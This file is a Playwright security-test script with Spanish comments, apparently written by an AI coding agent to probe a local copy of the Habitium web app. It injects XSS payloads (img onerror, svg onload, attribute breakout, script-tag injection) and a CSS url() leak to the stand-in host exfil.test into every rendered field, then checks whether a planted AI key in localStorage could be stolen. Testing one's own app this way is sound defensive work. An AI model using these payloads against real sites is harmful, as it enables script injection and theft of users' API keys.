// Ataque real contra la web de Habitium.
//
// Mete payloads en TODOS los campos de texto que acaban pintados, abre la
// app en Chromium y comprueba tres cosas:
//
//   1. ¿Se ejecuta algún script? (window.__pwned)
//   2. ¿Sale alguna petición a un dominio que no debería? (exfiltración
//      por CSS con url(), por <img src>, por fetch…)
//   3. ¿Se puede leer la clave de IA desde el DOM inyectado?
//
// Lo tercero es lo que convierte un XSS tonto en un problema serio: la
// clave de la IA vive en localStorage, así que cualquier script que
// consiga ejecutarse se la lleva y la factura la paga el dueño.

import pw from "/opt/node22/lib/node_modules/playwright/index.js";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";

const { chromium } = pw;
const BASE = "/tmp/claude-0/-home-user-Habitium/39bb3c0e-00ac-53d7-a1f5-985553bc6ac0/scratchpad";
const ROOT = path.join(BASE, "ataque");
const TIPOS = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css" };

const U = "11111111-1111-4111-8111-111111111111";
const ahora = new Date().toISOString();
let n = 0;
const fila = (x) => ({ id: `${String(++n).padStart(8, "0")}-1111-4111-8111-111111111111`, user_id: U, updated_at: ahora, ...x });

// ── Los payloads ────────────────────────────────────────────────────
const XSS_IMG = `<img src=x onerror="window.__pwned=(window.__pwned||0)+1">`;
const XSS_SVG = `<svg onload="window.__pwned=(window.__pwned||0)+1">`;
const XSS_ATTR = `" onmouseover="window.__pwned=(window.__pwned||0)+1" x="`;
const XSS_SCRIPT = `</span><script>window.__pwned=(window.__pwned||0)+1<\/script>`;
// Exfiltración por CSS: si un color de asignatura se mete tal cual en un
// atributo style, esto pide una imagen a un dominio de fuera.
const CSS_LEAK = `#fff;background-image:url('http://exfil.test/robado')`;

const hoy = new Date();
const dia = (d, h = 12) => new Date(hoy.getFullYear(), hoy.getMonth(), hoy.getDate() + d, h).toISOString();

const datos = {
  habits: [
    fila({ name: XSS_IMG, symbol_name: "drop.fill", kind: "checkbox", target_value: null, goal_direction: "atLeast", unit: XSS_ATTR, is_active: true, sort_order: 0, linked_to_workouts: false }),
    fila({ name: XSS_SCRIPT, symbol_name: "book.fill", kind: "numeric", target_value: 2, goal_direction: "atLeast", unit: "L", is_active: true, sort_order: 1, linked_to_workouts: false }),
  ],
  habit_logs: [],
  food_entries: [
    fila({ name: XSS_IMG, date: dia(0, 9), meal_type: XSS_ATTR, source: "manual", calories: 100, protein_grams: 1, carbs_grams: 1, fat_grams: 1, notes: XSS_SVG, analyzed_by: null }),
  ],
  weight_entries: [fila({ date: dia(0, 8), weight_kg: 70 })],
  planner_tasks: [
    fila({ title: XSS_SVG, notes: XSS_IMG, due_date: dia(0, 18), reminder_date: null, is_completed: false, priority: 0, is_focus: true, created_at: dia(-1) }),
  ],
  planner_events: [
    fila({ title: XSS_IMG, location: XSS_ATTR, notes: null, start_date: dia(0, 17), end_date: dia(0, 18), is_all_day: false, has_reminder: true, created_at: dia(-1) }),
  ],
  planner_notes: [fila({ date: dia(0, 0), text: XSS_IMG })],
  transactions: [
    fila({ amount: 10, type: "expense", category: XSS_ATTR, note: XSS_IMG, date: dia(0, 14) }),
  ],
  category_budgets: [fila({ category: XSS_ATTR, monthly_limit: 50 })],
  recurring_transactions: [fila({ name: XSS_IMG, amount: 5, type: "expense", category: "food", day_of_month: 1, is_active: true, last_applied_month: "", created_at: dia(-30) })],
  medications: [
    fila({ name: XSS_IMG, dosage: XSS_SVG, notes: null, reminder_minutes_since_midnight: [540], is_active: true, created_at: dia(-10) }),
  ],
  medication_dose_logs: [],
  workout_sets: [fila({ exercise_name: XSS_IMG, reps: 5, date: dia(-1, 19) })],
  xp_events: [fila({ source: XSS_ATTR, amount: 10, date: dia(0, 9), dedupe_key: "ataque:1" })],
  // Estudios: aquí está el color, que va a un atributo style.
  subjects: [
    fila({ name: XSS_IMG, icon: XSS_SVG, color: CSS_LEAK, teacher: null, total_classes: 10, hours_missed: 1, max_absences: 3, sort_order: 0 }),
    fila({ name: "Normal", icon: "📘", color: "#2563eb", teacher: null, total_classes: 10, hours_missed: 0, max_absences: 3, sort_order: 1 }),
  ],
  grades: [fila({ subject_id: null, name: XSS_IMG, score: 7, weight: 30, counts_for_average: true, date: dia(-2) })],
  study_events: [fila({ subject_id: null, title: XSS_IMG, kind: XSS_ATTR, date: dia(3, 9), notes: null })],
  nutrition_goals: [fila({ daily_calorie_goal: 2000, protein_goal_grams: 100, carbs_goal_grams: 200, fat_goal_grams: 60, target_weight_kg: 70, weekly_rate_kg: 0 })],
  budget_settings: [fila({ monthly_budget: 100, total_savings: 10, currency_code: "EUR", savings_goal_amount: 200, savings_goal_date: dia(60) })],
  user_settings: [fila({ preferred_ai_provider: "openAI", meal_reminder_notifications_enabled: true, event_notifications_enabled: true, apple_watch_enabled: false, display_name: XSS_IMG, email: "a@b.test" })],
  player_profiles: [fila({ total_xp: 300, login_streak: 3, longest_login_streak: 3, last_login_date: dia(0, 0), season_id: `${hoy.getFullYear()}-${String(hoy.getMonth() + 1).padStart(2, "0")}`, season_xp: 300, unlocked_reward_ids: ["t1", "t2"] })],
};

// El grade y el study_event apuntan a la asignatura maliciosa.
datos.grades[0].subject_id = datos.subjects[0].id;
datos.study_events[0].subject_id = datos.subjects[0].id;

// ── Montaje ─────────────────────────────────────────────────────────
fs.rmSync(ROOT, { recursive: true, force: true });
fs.mkdirSync(ROOT, { recursive: true });
for (const f of fs.readdirSync("/home/user/Habitium/web")) {
  if (/\.(js|css|html)$/.test(f)) fs.copyFileSync(path.join("/home/user/Habitium/web", f), path.join(ROOT, f));
}
fs.writeFileSync(path.join(ROOT, "config.js"),
  `window.HABITIUM_CONFIG = { SUPABASE_URL: "https://demo.supabase.co", SUPABASE_ANON_KEY: "clave_de_demo" };`);

fs.writeFileSync(path.join(ROOT, "fake-supabase.js"), `
const tablas = new Map(Object.entries(${JSON.stringify(datos)}));
const filas = (t) => tablas.get(t) ?? (tablas.set(t, []), tablas.get(t));
export function createClient() {
  const usuario = { id: "${U}", email: "victima@habitium.test" };
  const consulta = (tabla) => {
    const p = Promise.resolve({ data: filas(tabla), error: null });
    p.select = () => consulta(tabla); p.limit = () => consulta(tabla);
    p.eq = () => Promise.resolve({ data: null, error: null });
    p.delete = () => p;
    p.upsert = () => Promise.resolve({ data: null, error: null });
    return p;
  };
  return {
    auth: {
      getUser: async () => ({ data: { user: usuario } }),
      getSession: async () => ({ data: { session: { user: usuario } } }),
      onAuthStateChange: (cb) => { setTimeout(() => cb("SIGNED_IN", { user: usuario }), 0); return { data: {} }; },
      signOut: async () => ({}),
    },
    from: (t) => consulta(t),
  };
}`);

const server = http.createServer((req, res) => {
  const file = path.join(ROOT, req.url === "/" ? "index.html" : req.url.split("?")[0]);
  if (!fs.existsSync(file) || fs.statSync(file).isDirectory()) { res.writeHead(404); return res.end("no"); }
  res.writeHead(200, { "Content-Type": TIPOS[path.extname(file)] ?? "text/plain" });
  res.end(fs.readFileSync(file));
});
await new Promise((r) => server.listen(8395, r));

const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium-1194/chrome-linux/chrome" });
const page = await browser.newPage({ viewport: { width: 1280, height: 950 } });

const fuera = [];
page.on("request", (r) => {
  const u = r.url();
  if (!u.startsWith("http://localhost:8395") && !u.startsWith("data:") && !u.startsWith("blob:")) fuera.push(u);
});
const errores = [];
page.on("pageerror", (e) => errores.push(e.message));

const doble = fs.readFileSync(path.join(ROOT, "fake-supabase.js"), "utf8");
await page.route("**/supabase-js*/**", (r) => r.fulfill({ status: 200, contentType: "text/javascript", body: doble }));
await page.route("**/@supabase/**", (r) => r.fulfill({ status: 200, contentType: "text/javascript", body: doble }));

// La víctima ya tiene su clave de IA guardada: es lo que se quiere robar.
await page.addInitScript(() => {
  try { localStorage.setItem("habitium.aikey.openai", "sk-CLAVE-SECRETA-DE-LA-VICTIMA"); } catch (e) {}
});

await page.goto("http://localhost:8395/index.html");
await page.waitForTimeout(2600);

for (const v of ["home", "study", "progress", "nutrition", "planner", "finance", "habits", "medication", "settings"]) {
  await page.evaluate((id) => document.querySelector(`[data-view="${id}"]`)?.click(), v);
  await page.waitForTimeout(500);
  // Pasar el ratón por encima de todo, por si hay payloads en onmouseover.
  await page.evaluate(() => {
    document.querySelectorAll(".row, .card, .subject, td, .challenge").forEach((el) => {
      el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
    });
  });
  await page.waitForTimeout(150);
}

const pwned = await page.evaluate(() => window.__pwned ?? 0);
const claveVisible = await page.evaluate(() => {
  try { return localStorage.getItem("habitium.aikey.openai"); } catch (e) { return null; }
});
const csp = await page.evaluate(() =>
  document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? null);

console.log("── RESULTADO DEL ATAQUE ──────────────────────────────");
console.log("scripts ejecutados (window.__pwned):", pwned);
console.log("peticiones a dominios externos:", fuera.length ? fuera : "ninguna");
console.log("clave de IA legible desde la página:", claveVisible ? "SÍ — " + claveVisible : "no");
console.log("Content-Security-Policy:", csp ?? "NO HAY");
console.log("errores de página:", errores.length ? errores.slice(0, 3) : "ninguno");

await page.screenshot({ path: path.join(BASE, "ataque.png"), fullPage: false });
await browser.close();
server.close();
